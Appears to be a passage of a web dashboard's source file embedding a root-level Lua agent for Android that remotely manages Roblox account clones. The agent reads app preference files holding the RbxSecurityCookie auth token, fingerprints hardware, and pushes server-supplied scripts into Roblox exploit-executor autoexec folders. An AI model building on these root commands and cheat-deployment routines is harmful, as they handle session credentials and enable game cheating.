import { NextRequest, NextResponse } from "next/server";
import { redis } from "@/lib/redis";

export interface AgentConfig {
  HEARTBEAT_INTERVAL: number;
  RECONNECT_DELAY: number;

  POLICY_POLL_INTERVAL: number;
  STUCK_GRACE: number;
  REJOIN_SWEEP_INTERVAL: number;
}

export const AGENT_CONFIG_DEFAULTS: AgentConfig = {
  HEARTBEAT_INTERVAL: 30,
  RECONNECT_DELAY: 5,

  POLICY_POLL_INTERVAL: 15,
  STUCK_GRACE: 120,
  REJOIN_SWEEP_INTERVAL: 5,
};

const AGENT_CONFIG_KEY = "termux:agent-config";

const LUA_AGENT = `
local VERSION = "3.0"

-- ─── Config ───
local CONFIG_DIR = os.getenv("HOME") .. "/.cache/log"
local CONFIG_FILE = CONFIG_DIR .. "/naruhub_config.json"
local LOG_FILE = CONFIG_DIR .. "/naruhub_agent.log"
local BASE_URL = "https://naruhub.my.id"
local WS_URL = "wss://ws.naruhub.my.id"
local LICENSE_KEY = "$$LICENSE$$"
local HEARTBEAT_INTERVAL = $$HEARTBEAT_INTERVAL$$
local RECONNECT_DELAY = $$RECONNECT_DELAY$$

local CONFIG_POLL_INTERVAL = 60
local NEXT_CONFIG_POLL = 0

-- Paths set after CONFIG_DIR
local WS_INBOX = nil
local WS_OUTBOX = nil

-- ─── Colors ───
local C = {
  green  = "\\27[0;32m",
  cyan   = "\\27[0;36m",
  yellow = "\\27[0;33m",
  red    = "\\27[0;31m",
  bold   = "\\27[1m",
  dim    = "\\27[2m",
  reset  = "\\27[0m",
}

-- ─── Fix PATH when running via curl pipe ───
local PREFIX = os.getenv("PREFIX") or "/data/data/com.termux/files/usr"
local HOME = os.getenv("HOME") or "/data/data/com.termux/files/home"
os.execute(string.format('export PATH="%s/bin:%s/bin/applets:$PATH"', PREFIX, PREFIX))
-- For io.popen/os.execute subshells, inject PATH via env
local ENV_PREFIX = string.format('PATH="%s/bin:%s/bin/applets:/system/bin:/system/xbin:/usr/bin:/bin" ', PREFIX, PREFIX)

-- ─── Helpers ───
local function ts()
  return os.date("%H:%M:%S")
end

-- Buffer of recent log lines (ANSI stripped) waiting to be shipped to the
-- dashboard console via the /api/termux/logs webhook. Capped so a server
-- outage can't grow it without bound.
local LOG_BUFFER = {}
local LOG_BUFFER_MAX = 200

local function log(msg)
  io.write(msg .. "\\n")
  io.flush()
  local clean = msg:gsub("\\27%[[%d;]*m", "")
  local f = io.open(LOG_FILE, "a")
  if f then
    f:write(os.date("%Y-%m-%d %H:%M:%S") .. " " .. clean .. "\\n")
    f:close()
  end
  LOG_BUFFER[#LOG_BUFFER+1] = os.date("%H:%M:%S") .. " " .. clean
  if #LOG_BUFFER > LOG_BUFFER_MAX then table.remove(LOG_BUFFER, 1) end
end

local function shell(cmd)
  local h = io.popen(ENV_PREFIX .. cmd .. " 2>/dev/null", "r")
  if not h then return "" end
  local out = h:read("*a") or ""
  h:close()
  return out:gsub("%s+$", "")
end

local function shellcode(cmd)
  local ok = os.execute(ENV_PREFIX .. cmd .. " >/dev/null 2>&1")
  if type(ok) == "number" then return ok == 0 end
  return ok == true
end

local function sleep(n)
  if n > 0 then os.execute("sleep " .. n) end
end

math.randomseed(os.time() + (tonumber(tostring({}):match("0x(%x+)")) or 0))
local function jitter(base, pct)
  pct = pct or 0.2
  local lo = base * (1 - pct)
  local hi = base * (1 + pct)
  return lo + math.random() * (hi - lo)
end

local function fread(path)
  local f = io.open(path, "r")
  if not f then return nil end
  local s = f:read("*a")
  f:close()
  return s
end

local function fwrite(path, content)
  local f = io.open(path, "w")
  if not f then return false end
  f:write(content)
  f:close()
  return true
end

-- ─── Minimal JSON ───
local json = {}

function json.encode(val)
  local t = type(val)
  if t == "nil" then return "null" end
  if t == "boolean" then return val and "true" or "false" end
  if t == "number" then return tostring(val) end
  if t == "string" then
    return '"' .. val:gsub('\\\\', '\\\\\\\\'):gsub('"', '\\\\"'):gsub('\\n', '\\\\n'):gsub('\\r', '\\\\r'):gsub('\\t', '\\\\t') .. '"'
  end
  if t == "table" then
    if #val > 0 or next(val) == nil and val[1] ~= nil then
      local isArr = true
      local maxn = 0
      for k in pairs(val) do
        if type(k) ~= "number" then isArr = false; break end
        if k > maxn then maxn = k end
      end
      if isArr and maxn == #val then
        local parts = {}
        for i = 1, #val do parts[i] = json.encode(val[i]) end
        return "[" .. table.concat(parts, ",") .. "]"
      end
    end
    if next(val) == nil then return "{}" end
    local parts = {}
    for k, v in pairs(val) do
      parts[#parts+1] = json.encode(tostring(k)) .. ":" .. json.encode(v)
    end
    return "{" .. table.concat(parts, ",") .. "}"
  end
  return "null"
end

function json.decode(str)
  if not str or str == "" then return nil end
  local pos = 1
  local function skip_ws()
    pos = str:find("[^ \\t\\n\\r]", pos) or pos
  end
  local function parse_string()
    if str:sub(pos, pos) ~= '"' then return nil end
    pos = pos + 1
    local s = {}
    while pos <= #str do
      local ch = str:sub(pos, pos)
      if ch == '"' then pos = pos + 1; return table.concat(s) end
      if ch == '\\\\' then
        pos = pos + 1
        ch = str:sub(pos, pos)
        if ch == 'n' then s[#s+1] = '\\n'
        elseif ch == 't' then s[#s+1] = '\\t'
        elseif ch == 'r' then s[#s+1] = '\\r'
        else s[#s+1] = ch end
      else
        s[#s+1] = ch
      end
      pos = pos + 1
    end
    return table.concat(s)
  end
  local parse_value
  local function parse_array()
    if str:sub(pos, pos) ~= '[' then return nil end
    pos = pos + 1
    local arr = {}
    skip_ws()
    if str:sub(pos, pos) == ']' then pos = pos + 1; return arr end
    while true do
      skip_ws()
      arr[#arr+1] = parse_value()
      skip_ws()
      if str:sub(pos, pos) == ',' then pos = pos + 1
      elseif str:sub(pos, pos) == ']' then pos = pos + 1; return arr
      else return arr end
    end
  end
  local function parse_object()
    if str:sub(pos, pos) ~= '{' then return nil end
    pos = pos + 1
    local obj = {}
    skip_ws()
    if str:sub(pos, pos) == '}' then pos = pos + 1; return obj end
    while true do
      skip_ws()
      local key = parse_string()
      skip_ws()
      if str:sub(pos, pos) == ':' then pos = pos + 1 end
      skip_ws()
      obj[key] = parse_value()
      skip_ws()
      if str:sub(pos, pos) == ',' then pos = pos + 1
      elseif str:sub(pos, pos) == '}' then pos = pos + 1; return obj
      else return obj end
    end
  end
  function parse_value()
    skip_ws()
    local ch = str:sub(pos, pos)
    if ch == '"' then return parse_string()
    elseif ch == '{' then return parse_object()
    elseif ch == '[' then return parse_array()
    elseif ch == 't' then pos = pos + 4; return true
    elseif ch == 'f' then pos = pos + 5; return false
    elseif ch == 'n' then pos = pos + 4; return nil
    else
      local num = str:match("^%-?%d+%.?%d*[eE]?[+-]?%d*", pos)
      if num then pos = pos + #num; return tonumber(num) end
      return nil
    end
  end
  return parse_value()
end

-- ─── Device info ───
local function get_device_id()
  -- Stable hardware fingerprint so the same physical device always gets the
  -- same id, even if the config file is wiped or across App Cloner clones.
  local parts = {}
  local function add(v)
    if v and v ~= "" and v ~= "unknown" and v ~= "null" then
      parts[#parts+1] = v
    end
  end

  -- getprop keys (try several serial variants -- restricted on Android 10+)
  add(shell("getprop ro.serialno"))
  add(shell("getprop ro.boot.serialno"))
  add(shell("getprop ro.build.serial"))
  add(shell("getprop ro.product.model"))
  add(shell("getprop ro.product.manufacturer"))
  add(shell("getprop ro.product.device"))
  add(shell("getprop ro.product.board"))
  add(shell("getprop ro.hardware"))
  add(shell("getprop ro.build.fingerprint"))

  -- android_id (via su if plain settings fails)
  local aid = shell("settings get secure android_id")
  if aid == "" or aid == "null" then aid = shell('su -c "settings get secure android_id"') end
  add(aid)

  -- MAC address (needs su on Android 10+)
  local mac = fread("/sys/class/net/wlan0/address")
  if not mac or mac == "" then mac = shell('su -c "cat /sys/class/net/wlan0/address"') end
  if mac then add(mac:gsub("%s+", "")) end

  -- Kernel version + bootloader (stable per device firmware)
  add(shell("getprop ro.bootloader"))

  if #parts >= 2 then
    local fp = table.concat(parts, "|")
    local hash = shell(string.format("printf %%s %q | sha256sum | cut -c1-32", fp))
    if hash ~= "" then return hash end
  end

  -- Last-resort fallback: random uuid (not stable across resets)
  local raw = fread("/proc/sys/kernel/random/uuid")
  if raw and #raw > 0 then return raw:gsub("%s+", "") end
  return tostring(os.time()) .. tostring(math.random(100000, 999999))
end

local function get_prop(key)
  local v = shell("getprop " .. key)
  return v ~= "" and v or "?"
end

-- Android SDK version: am stack list was removed in Android 12 (SDK 31).
-- Use dumpsys activity activities as fallback on 12+.
local SDK_INT = tonumber((shell("getprop ro.build.version.sdk"))) or 0
local ANDROID_VER = shell("getprop ro.build.version.release")
if ANDROID_VER == "" then ANDROID_VER = "?" end
local DEVICE_MODEL = shell("getprop ro.product.model")
if DEVICE_MODEL == "" then DEVICE_MODEL = "?" end

local function get_activity_stack()
  if SDK_INT >= 31 then
    return shell('su -c "dumpsys activity activities"')
  end
  return shell('su -c "am stack list"')
end

-- ─── Forward-declare state (must be before functions that reference them) ───
local DEVICE_ID, HOSTNAME, PLATFORM, IS_NEW

-- ─── Package collection ───
local function collect_packages()
  local raw = shell('su -c "pm list packages -f" | grep -i roblox')
  if raw == "" then return {} end
  local pkgs = {}
  for line in raw:gmatch("[^\\n]+") do
    local pkg = line:match("=([%w%.]+)$")
    if pkg then
      local username = ""
      local prefs = shell(string.format('su -c "cat /data/data/%s/shared_prefs/prefs.xml"', pkg))
      if prefs ~= "" then
        username = prefs:match('<string name="username">([^<]*)</string>') or ""
        -- If auth cookie field EXISTS but is empty, the account logged out
        -- even though username is cached. Only clear when the field is
        -- present -- some Roblox versions/clones omit the field entirely.
        if username ~= "" and prefs:find("RbxSecurityCookie") then
          local cookie = prefs:match('<string name="RbxSecurityCookie">([^<]*)</string>')
          if not cookie or cookie == "" then
            username = ""
          end
        end
      end
      pkgs[#pkgs+1] = { pkg = pkg, label = pkg, username = username }
    end
  end
  return pkgs
end

-- Roblox packages currently in the activity stack (i.e. running). The server
-- brain uses this to tell a force-closed / not-open clone (relaunch fast, no
-- loading to protect) from one that's running but not yet in a game (give it
-- the full 300s loading grace).
local function collect_running()
  local stack = get_activity_stack()
  local running = {}
  local seen = {}
  for line in stack:gmatch("[^\\n]+") do
    for pkg in line:gmatch("([%w%.]+)/[%w%.$]+") do
      if pkg:lower():find("roblox", 1, true) and not seen[pkg] then
        seen[pkg] = true
        running[#running+1] = pkg
      end
    end
  end
  return running
end

-- ─── Screen detection ───
local function collect_screen()
  local cur = shell('su -c "dumpsys window displays" | grep -m1 -oE "cur=[0-9]+x[0-9]+"')
  if cur == "" then
    cur = shell('su -c "dumpsys window" | grep -m1 -oE "cur=[0-9]+x[0-9]+"')
  end
  if cur ~= "" then
    local w, h = cur:match("cur=(%d+)x(%d+)")
    if w and h then return { width = tonumber(w), height = tonumber(h) } end
  end
  local raw = shell('su -c "wm size"')
  local w, h = raw:match("(%d+)x(%d+)")
  if w and h then
    w, h = tonumber(w), tonumber(h)
    local rot = shell('su -c "dumpsys input" | grep -m1 SurfaceOrientation | grep -oE "[0-9]+"')
    if rot == "1" or rot == "3" then w, h = h, w end
    return { width = w, height = h }
  end
  return nil
end

-- ─── Stats ───
local function collect_stats()
  local stats = {}
  local batt_pct = fread("/sys/class/power_supply/battery/capacity")
  local batt_status = fread("/sys/class/power_supply/battery/status")
  stats.battery = {
    percent = batt_pct and tonumber(batt_pct:match("%d+")) or nil,
    charging = batt_status and batt_status:match("Charging") ~= nil or false,
  }
  local meminfo = fread("/proc/meminfo") or ""
  local mem_total = tonumber(meminfo:match("MemTotal:%s*(%d+)")) or 0
  local mem_avail = tonumber(meminfo:match("MemAvailable:%s*(%d+)")) or 0
  stats.ram = { totalMB = math.floor(mem_total / 1024), usedMB = math.floor((mem_total - mem_avail) / 1024) }
  local loadavg = fread("/proc/loadavg") or "0 0 0"
  local l1, l5, l15 = loadavg:match("([%d%.]+)%s+([%d%.]+)%s+([%d%.]+)")
  stats.load = { ["1m"] = tonumber(l1) or 0, ["5m"] = tonumber(l5) or 0, ["15m"] = tonumber(l15) or 0 }
  local dfline = shell("df -k $HOME | tail -1")
  local df_total, df_free = 0, 0
  if dfline ~= "" then
    local parts = {}
    for p in dfline:gmatch("%S+") do parts[#parts+1] = p end
    df_total = tonumber(parts[2]) or 0
    df_free = tonumber(parts[4]) or 0
  end
  stats.storage = { totalMB = math.floor(df_total / 1024), freeMB = math.floor(df_free / 1024) }
  local cpuinfo = fread("/proc/cpuinfo") or ""
  local cores = 0
  for _ in cpuinfo:gmatch("processor%s*:") do cores = cores + 1 end
  if cores == 0 then cores = 4 end
  stats.cpuCores = cores
  return stats
end

-- ─── Resize via shared_prefs ───
-- Seed a minimal preferences XML with the App Cloner window keys so the
-- FIRST launch of a fresh clone already lands at our tile bounds. Without
-- this, the very first launch after install renders fullscreen (App Cloner
-- creates the file only after that first launch), which triggers force-
-- close cascades on 4GB devices because two fullscreen Roblox instances
-- overwhelm RAM.
local function seed_prefs(pkg, prefFile, left, top, right, bottom)
  local dir = string.format("/data/data/%s/shared_prefs", pkg)
  shellcode(string.format('su -c "mkdir -p %s"', dir))
  local body = string.format(
    [[<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <int name="app_cloner_launch_window_left" value="%d" />
    <int name="app_cloner_launch_window_top" value="%d" />
    <int name="app_cloner_launch_window_right" value="%d" />
    <int name="app_cloner_launch_window_bottom" value="%d" />
    <int name="app_cloner_current_window_left" value="%d" />
    <int name="app_cloner_current_window_top" value="%d" />
    <int name="app_cloner_current_window_right" value="%d" />
    <int name="app_cloner_current_window_bottom" value="%d" />
    <int name="app_cloner_original_window_left" value="%d" />
    <int name="app_cloner_original_window_top" value="%d" />
    <int name="app_cloner_original_window_right" value="%d" />
    <int name="app_cloner_original_window_bottom" value="%d" />
</map>
]],
    left, top, right, bottom,
    left, top, right, bottom,
    left, top, right, bottom
  )
  -- Stage the XML in Termux's own writeable tmp dir, then cp into the
  -- app's shared_prefs via su. Avoids the heredoc vs redirect clash that
  -- made the previous seed_prefs silently no-op (heredoc terminator
  -- PREF_EOF stopped being alone on its line once the shellcode wrapper
  -- appended > /dev/null 2>&1, so nothing was ever written and fresh
  -- clones opened at App Cloner's default fullscreen instead of our
  -- tile bounds).
  local tmp = CONFIG_DIR .. "/.seed_prefs.xml"
  fwrite(tmp, body)
  shellcode("su -c \\"cp '" .. tmp .. "' '" .. prefFile .. "'\\"")
  os.remove(tmp)
  -- Match Android's expected perms so the app can read it.
  local uid = shell(string.format('su -c "stat -c %%u /data/data/%s"', pkg))
  if uid ~= "" then
    shellcode("su -c \\"chown " .. uid .. ":" .. uid .. " '" .. prefFile .. "'\\"")
  end
  shellcode("su -c \\"chmod 660 '" .. prefFile .. "'\\"")
end

local function set_window_bounds(pkg, left, top, right, bottom)
  local prefFile = string.format("/data/data/%s/shared_prefs/%s_preferences.xml", pkg, pkg)
  local exists = shellcode(string.format('su -c "test -f %s"', prefFile))
  if not exists then
    seed_prefs(pkg, prefFile, left, top, right, bottom)
    return true
  end
  for _, prefix in ipairs({"launch", "current", "original"}) do
    for _, side in ipairs({"left", "top", "right", "bottom"}) do
      local val = ({left=left, top=top, right=right, bottom=bottom})[side]
      local sed = string.format(
        [[su -c "sed -i 's/app_cloner_%s_window_%s\\" value=\\"[0-9]*/app_cloner_%s_window_%s\\" value=\\"%d/' %s"]],
        prefix, side, prefix, side, val, prefFile
      )
      shellcode(sed)
    end
  end
  return true
end

-- ─── Command dedupe ───
-- A single admin action can reach us BOTH via the HTTP command queue AND
-- via a WS push, which would run launch_app twice for the same package.
-- Track seen command ids and skip duplicates. Keep the map small by
-- expiring entries after 5 minutes.
local SEEN_COMMANDS = {}
local SEEN_TTL = 300
local function was_seen(cmd_id)
  if not cmd_id then return false end -- old commands without ids: always run
  local now = os.time()
  -- Sweep old entries every call (cheap; map stays tiny).
  for k, ts in pairs(SEEN_COMMANDS) do
    if now - ts > SEEN_TTL then SEEN_COMMANDS[k] = nil end
  end
  if SEEN_COMMANDS[cmd_id] then return true end
  SEEN_COMMANDS[cmd_id] = now
  return false
end

-- ─── Launch app ───
-- kill_pkg must ONLY kill the exact package (not sibling App Cloner clones
-- whose package names share a prefix). pgrep -f matches on the full cmdline
-- and is too broad; pgrep -x matches only exact process names, which is
-- what Android uses for app processes (proc/<pid>/cmdline).
local function kill_pkg(pkg)
  shellcode(string.format('su -c "am force-stop %s"', pkg))
  local pids = shell(string.format('su -c "pgrep -x %s"', pkg))
  if pids ~= "" then
    for line in pids:gmatch("[^\\n]+") do
      shellcode(string.format('su -c "kill -9 %s"', line))
    end
  end
end

-- Reliable per-package kill for the Siap Jual force-relaunch. am force-stop
-- targets EXACTLY the named package -- App Cloner clones have independent
-- UIDs, so force-stopping one never touches sibling clones. pidof/pgrep -x
-- alone proved unreliable (clone process names don't always equal the
-- package name, so pidof returns nothing and the kill silently no-ops,
-- which is why Siap Jual only reopened to home sometimes). We force-stop
-- first, then sweep leftover PIDs by EXACT name match only -- never
-- pgrep -f, whose substring match could catch sibling clones that share a
-- name prefix (that fallback is what risked closing the wrong clients).
local function kill_pkg_pidonly(pkg)
  shellcode(string.format('su -c "am force-stop %s"', pkg))
  local pids = shell(string.format('su -c "pidof %s"', pkg))
  if pids == "" then
    pids = shell(string.format('su -c "pgrep -x %s"', pkg))
  end
  if pids ~= "" then
    for pid in pids:gmatch("%S+") do
      shellcode(string.format('su -c "kill -9 %s"', pid))
    end
  end
end

-- Is this package currently in the activity stack? Uses am stack list
-- (reliable for long Android package names -- pgrep -x fails because
-- /proc/<pid>/comm is truncated to 15 chars).
local function is_pkg_running(pkg)
  local stack = get_activity_stack()
  return stack:find(pkg .. "/", 1, true) ~= nil
end

local function has_ghost_pid(pkg)
  local pids = shell(string.format('su -c "pidof %s"', pkg))
  return pids ~= ""
end

-- Kill only when forceKill is set (Siap Jual flow). Normal launches
-- never kill — just am start like first time opening.
local function kill_if_forced(pkg, forceKill)
  if not forceKill then return false end
  if not is_pkg_running(pkg) and not has_ghost_pid(pkg) then return false end
  kill_pkg_pidonly(pkg)
  sleep(2)
  if is_pkg_running(pkg) then
    kill_pkg_pidonly(pkg)
    sleep(2)
  end
  return true
end

-- Free reclaimable RAM WITHOUT killing anything, right before a launch.
-- Android's low-memory killer counts page cache as pressure; when a new
-- clone opens and RAM is tight it culls a backgrounded in-game clone, which
-- the operator sees as a random force-close of the OTHER accounts. Dropping
-- caches (+ asking background apps to release memory) hands that headroom
-- back so the LMK leaves the running clones alone. This is the "trim per-
-- launch" HipHub does -- caches only, never a kill, so unlike the old
-- every-heartbeat trim it can't nuke a clone that just went to background.
local function get_total_ram_mb()
  local raw = shell('su -c "cat /proc/meminfo"')
  local total = raw:match("MemTotal:%s+(%d+)")
  return total and tonumber(total) / 1024 or 0
end

local TOTAL_RAM_MB = 0

local function get_proc_rss_mb(pid)
  local raw = shell('su -c "cat /proc/' .. pid .. '/statm 2>/dev/null"')
  if raw == "" then return 0 end
  local pages = raw:match("^%d+%s+(%d+)")
  return pages and (tonumber(pages) * 4 / 1024) or 0
end

local function trim_ram()
  local running = collect_running()
  if #running == 0 then return end
  for _, pkg in ipairs(running) do
    shellcode('su -c "am send-trim-memory ' .. pkg .. ' RUNNING_CRITICAL"')
  end
end

local NEXT_RAM_LOG = 0
local function log_ram_status()
  local now = os.time()
  if now < NEXT_RAM_LOG then return end
  local running = collect_running()
  if #running == 0 then return end
  if TOTAL_RAM_MB == 0 then TOTAL_RAM_MB = get_total_ram_mb() end
  if TOTAL_RAM_MB == 0 then return end

  local mem_raw = shell('su -c "cat /proc/meminfo"')
  local mem_avail_kb = tonumber(mem_raw:match("MemAvailable:%s+(%d+)")) or 0
  local mem_avail_mb = math.floor(mem_avail_kb / 1024)
  local mem_pct = math.floor(mem_avail_mb / TOTAL_RAM_MB * 100)

  local parts = {}
  for _, pkg in ipairs(running) do
    local pids = shell('su -c "pidof ' .. pkg .. '"')
    if pids ~= "" then
      local rss = 0
      for pid in pids:gmatch("%S+") do
        rss = rss + get_proc_rss_mb(pid)
      end
      if rss > 0 then
        parts[#parts+1] = pkg:gsub("com.roblox.", "") .. "=" .. math.floor(rss) .. "MB"
      end
    end
  end

  if #parts > 0 then
    local color = mem_pct < 15 and C.red or (mem_pct < 30 and C.yellow or C.dim)
    log(color .. "[" .. ts() .. "] RAM " .. mem_avail_mb .. "/" .. math.floor(TOTAL_RAM_MB) .. "MB (" .. mem_pct .. "% free) | " .. table.concat(parts, " ") .. C.reset)
  end
  NEXT_RAM_LOG = now + 1800
end


local function launch_app(pkg, bounds, resize, delay, target, forceKill, skipTrim, silent)
  if not silent then
    log(C.cyan .. "[" .. ts() .. "] launching " .. pkg:gsub("com.roblox.", "") .. C.reset)
  end
  -- A targeted (deep-link) launch must cold-start: Roblox only acts on a
  -- roblox://placeId join from a FRESH process. If the app is already up --
  -- e.g. stuck on an error/reconnect screen after a failed launch -- then
  -- am start VIEW just refocuses it and never joins the place. So force-stop
  -- first whenever there's a target, not only for the Siap Jual flow.
  -- (kill_if_forced no-ops when the package isn't running, so a normal cold
  -- launch pays nothing.)
  local wantKill = forceKill or (target ~= nil and target ~= "")
  kill_if_forced(pkg, wantKill)
  if not skipTrim then trim_ram() end

  if resize and bounds and bounds ~= "" then
    local left, top, right, bottom = bounds:match("(%d+),(%d+),(%d+),(%d+)")
    if left then
      set_window_bounds(pkg, tonumber(left), tonumber(top), tonumber(right), tonumber(bottom))
    end
  end

  -- Use VIEW intent for roblox:// deep links and https://www.roblox.com URLs.
  -- The -p flag forces the Roblox package to handle it (no browser).
  local use_target = target and target ~= "" and (target:sub(1,9) == "roblox://" or target:find("roblox.com/", 1, true))
  if use_target then
    local safe = target:gsub('"', '\\\\"')
    local ok = shellcode(string.format(
      'su -c "am start -a android.intent.action.VIEW -d \\\\"%s\\\\" -p %s"',
      safe, pkg
    ))
    if not ok then
      shellcode(string.format('su -c "am start -a android.intent.action.MAIN -c android.intent.category.LAUNCHER -p %s"', pkg))
    end
  else
    shellcode(string.format('su -c "am start -a android.intent.action.MAIN -c android.intent.category.LAUNCHER -p %s"', pkg))
  end

  -- Wait for the app window to actually be drawn on screen, not just for
  -- the task to be registered in the activity stack. Roblox in particular
  -- shows a splash + long "Loading..." phase after the task exists; if we
  -- consider it "ready" the instant the task appears, we'll fire the next
  -- launch before this one has finished initializing.
  local waited = 0
  local task_seen = false
  while waited < 60 do
    local stack = get_activity_stack()
    if stack:find(pkg .. "/", 1, true) then
      task_seen = true
      -- Check the app's window is actually visible AND has focus / is
      -- drawn. mCurrentFocus should point to this pkg once the first
      -- real activity window is up.
      local focus = shell('su -c "dumpsys window" | grep -E "mCurrentFocus|mFocusedApp"')
      if focus:find(pkg, 1, true) then break end
    end
    sleep(2)
    waited = waited + 2
  end
  if waited >= 60 and not task_seen then
    log(C.yellow .. "[" .. ts() .. "] timeout " .. pkg:gsub("com.roblox.", "") .. C.reset)
  end

  delay = tonumber(delay) or 10
  if delay > 0 then sleep(math.floor(jitter(delay, 0.25))) end
end

-- Rapid-fire an am start for one package WITHOUT waiting for it to finish
-- initializing. No kill — just am start.
local function fire_start(pkg, target)
  local use_target = target and target ~= "" and target:sub(1,9) == "roblox://"
  if use_target then
    local safe = target:gsub('"', '\\\\"')
    local ok = shellcode(string.format(
      'su -c "am start -a android.intent.action.VIEW -d \\\\"%s\\\\" -p %s"',
      safe, pkg
    ))
    if not ok then
      shellcode(string.format('su -c "am start -a android.intent.action.MAIN -c android.intent.category.LAUNCHER -p %s"', pkg))
    end
  else
    shellcode(string.format('su -c "am start -a android.intent.action.MAIN -c android.intent.category.LAUNCHER -p %s"', pkg))
  end
end

-- Batch launch: opens packages one by one, each waiting for focus +
-- launchDelay before proceeding to the next. Sequential, not rapid-fire.
local function batch_launch(cmds)
  if #cmds == 0 then return end
  log(C.cyan .. "[" .. ts() .. "] batch launch " .. #cmds .. " pkgs" .. C.reset)
  for i, c in ipairs(cmds) do
    launch_app(c.package, c.bounds, c.resize, c.launchDelay, c.target, c.forceKill)
  end
end

-- ─── HTTP helpers (writes to Redis so dashboard can read) ───
local function http_post(path, body_table)
  local body = json.encode(body_table)
  local tmpfile = CONFIG_DIR .. "/.http_body.json"
  fwrite(tmpfile, body)
  local url = BASE_URL .. path
  local cmd = string.format(
    "curl -s -L -w '%%{http_code}' -o /dev/null '%s' -H 'Content-Type: application/json' -H 'X-Access-Key: %s' -d @%s",
    url, LICENSE_KEY, tmpfile
  )
  local result = shell(cmd)
  return result
end

local function http_register()
  if not DEVICE_ID then
    log(C.red .. "[" .. ts() .. "] skip HTTP register: no deviceId" .. C.reset)
    return
  end
  log(C.dim .. "[" .. ts() .. "] HTTP register deviceId=" .. DEVICE_ID:sub(1,8) .. C.reset)
  local code = http_post("/api/termux/register", {
    deviceId = DEVICE_ID,
    hostname = HOSTNAME or "unknown",
    platform = PLATFORM or "unknown",
  })
  if code == "200" then
    log(C.green .. "[" .. ts() .. "] HTTP register ok" .. C.reset)
  else
    log(C.red .. "[" .. ts() .. "] HTTP register failed (" .. code .. ")" .. C.reset)
  end
end

local function http_heartbeat(pkgs, screen, stats, running)
  if not DEVICE_ID then return end
  local code = http_post("/api/termux/heartbeat", {
    deviceId = DEVICE_ID,
    packages = pkgs or {},
    running = running or {},
    screen = screen,
    stats = stats or {},
    androidVersion = ANDROID_VER or "?",
    model = DEVICE_MODEL or "?",
    sdkInt = SDK_INT or 0,
  })
  if code ~= "200" then
    log(C.red .. "[" .. ts() .. "] HTTP heartbeat failed (" .. code .. ")" .. C.reset)
  end
end

-- GET helper -- returns response body as string (not just status code).
-- Used for the policy poll below.
local function http_get(path)
  local url = BASE_URL .. path
  local cmd = string.format(
    "curl -s -L -X GET '%s' -H 'X-Access-Key: %s'",
    url, LICENSE_KEY
  )
  return shell(cmd)
end

local function poll_config_if_due()
  local now = os.time()
  if now < NEXT_CONFIG_POLL then return end
  NEXT_CONFIG_POLL = now + CONFIG_POLL_INTERVAL
  local raw = http_get("/api/device-control/agent-config/values")
  if raw and raw ~= "" then
    local ok, cfg = pcall(json.decode, raw)
    if ok and cfg then
      if cfg.HEARTBEAT_INTERVAL then HEARTBEAT_INTERVAL = cfg.HEARTBEAT_INTERVAL end
      if cfg.RECONNECT_DELAY then RECONNECT_DELAY = cfg.RECONNECT_DELAY end
      if cfg.POLICY_POLL_INTERVAL then POLICY_POLL_INTERVAL = cfg.POLICY_POLL_INTERVAL end
      if cfg.STUCK_GRACE then STUCK_GRACE = cfg.STUCK_GRACE end
      if cfg.REJOIN_SWEEP_INTERVAL then REJOIN_SWEEP_INTERVAL = cfg.REJOIN_SWEEP_INTERVAL end
    end
  end
end

-- Ship buffered log lines to the dashboard console (webhook). Deliberately
-- SILENT -- it must never call log() itself, or it would refill the very
-- buffer it drains. On failure it puts the lines back (respecting the cap)
-- so a brief server blip doesn't lose them.
local NEXT_LOG_FLUSH = 0
local LOG_FLUSH_INTERVAL = 3
local function flush_logs()
  if not DEVICE_ID or #LOG_BUFFER == 0 then return end
  local lines = LOG_BUFFER
  LOG_BUFFER = {}
  local code = http_post("/api/termux/logs", { deviceId = DEVICE_ID, lines = lines })
  if code ~= "200" then
    for i = #lines, 1, -1 do table.insert(LOG_BUFFER, 1, lines[i]) end
    while #LOG_BUFFER > LOG_BUFFER_MAX do table.remove(LOG_BUFFER, 1) end
  end
end

-- ─── Autoexec: write / remove Lua scripts in executor autoexec dirs ───
-- Universal deploy -- writes to ALL known executor autoexec paths so the
-- operator does not have to know which executor is installed. mkdir -p
-- creates missing dirs; a path that fails silently is fine (executor not
-- installed on this device).
local AUTOEXEC_PATHS = {
  "/storage/emulated/0/Delta/Autoexecute",
  "/storage/emulated/0/Hydrogen/AutoExec",
  "/storage/emulated/0/Arceus X/Autoexec",
  "/storage/emulated/0/Fluxus/AutoExec",
  "/storage/emulated/0/Vegax/AutoExec",
}

local function autoexec_write(filename, content)
  if not filename or filename == "" then return end
  -- Path safety: strip anything that looks like a directory separator.
  local safe = filename:gsub("[/\\\\%z]+", ""):gsub("^%.+", "")
  if safe == "" then return end
  -- Stage content in Termux private tmp, then cp with su into each dir.
  local tmp = CONFIG_DIR .. "/.autoexec_stage.lua"
  fwrite(tmp, content or "")
  local ok_count = 0
  local skipped = 0
  for _, dir in ipairs(AUTOEXEC_PATHS) do
    -- Only deploy to executors that are actually installed on this device.
    -- Parent = /storage/emulated/0/<Executor>. If missing, the executor
    -- is not there and we should NOT create a stray folder.
    local parent = dir:match("^(.+)/[^/]+$")
    local parent_ok = parent and shellcode("su -c \\"test -d '" .. parent .. "'\\"")
    if not parent_ok then
      skipped = skipped + 1
    else
      local dst = dir .. "/" .. safe
      -- Autoexec subdir may not exist yet even when the executor is
      -- installed; safe to create just that leaf.
      shellcode("su -c \\"mkdir -p '" .. dir .. "'\\"")
      if shellcode("su -c \\"cp '" .. tmp .. "' '" .. dst .. "'\\"") then
        shellcode("su -c \\"chmod 644 '" .. dst .. "'\\"")
        ok_count = ok_count + 1
      end
    end
  end
  os.remove(tmp)
  log(C.green .. "[" .. ts() .. "] autoexec " .. safe ..
      " -> " .. ok_count .. " executor(s) ok, " .. skipped .. " not installed" .. C.reset)
end

-- Uninstall a single package via pm uninstall. Silently no-op if the
-- package is not installed (pm returns Failure but does not crash us).
local function uninstall_pkg(pkg)
  if not pkg or pkg == "" then return end
  local safe = pkg:gsub("[^%w%.]", "")
  if safe == "" then return end
  local ok = shellcode("su -c \\"pm uninstall '" .. safe .. "'\\"")
  if not ok then
    shellcode("su -c \\"cmd package uninstall '" .. safe .. "'\\"")
  end
  log(C.yellow .. "[" .. ts() .. "] uninstall " .. safe .. C.reset)
end

local function autoexec_remove(filename)
  if not filename or filename == "" then return end
